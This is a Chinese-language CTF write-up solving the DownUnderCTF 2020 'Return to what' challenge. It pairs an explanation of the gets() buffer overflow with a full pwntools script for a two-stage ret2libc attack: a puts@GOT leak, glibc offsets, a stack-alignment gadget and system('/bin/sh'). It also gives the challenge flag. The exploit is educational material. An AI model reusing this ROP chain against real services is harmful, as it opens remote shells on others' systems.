# DownUnderCTF 2020 - Return to what

## 题目简述

程序在 40 字节栈缓冲区上调用无长度限制的 `gets`。二进制关闭 PIE 和栈保护但启用 NX，不能直接执行栈上 shellcode；目标是先用 ROP 泄露 libc 地址，再调用 `system("/bin/sh")`。

## 解题过程

漏洞函数为：

```c
void vuln() {
    char name[40];
    puts("Where would you like to return to?");
    gets(name);
}
```

用循环模式定位后，保存返回地址距输入开头 56 字节。第一阶段把 `puts@GOT` 作为参数交给 `puts@PLT`，打印其运行时地址，然后返回 `main` 获取第二次输入：

```python
from pwn import *

elf = ELF("./return-to-what", checksec=False)
io = remote("host", 30003)

offset = 56
pop_rdi = 0x40122b
ret = 0x401016

stage1 = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"],
)
io.recvuntil(b"return to?\n")
io.sendline(stage1)

puts_addr = u64(io.recvline().strip().ljust(8, b"\0"))
```

官方目标使用的 glibc 偏移为：

```python
libc_base = puts_addr - 0x0809c0
system = libc_base + 0x04f440
bin_sh = libc_base + 0x1b3e9a
```

第二阶段先放一个单独的 `ret`，修正 x86-64 SysV ABI 要求的 16 字节栈对齐，再令 `rdi` 指向 libc 中的 `/bin/sh` 并调用 `system`：

```python
stage2 = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    bin_sh,
    system,
)
io.recvuntil(b"return to?\n")
io.sendline(stage2)
io.interactive()
```

取得 shell 后读取 flag：

```text
DUCTF{ret_pUts_ret_main_ret_where???}
```

若改在不同 libc 上复现，不能沿用上述三个偏移，应从实际 libc 符号表计算 `puts`、`system` 和 `/bin/sh`。

## 方法总结

这是标准的两阶段 ret2libc：第一条 ROP 链利用 PLT/GOT 泄露共享库地址并回到 `main`，第二条链在已知 libc 基址后调用 `system("/bin/sh")`。实际调试中最容易遗漏的是保存 RIP 偏移与 `system` 调用前的栈对齐。
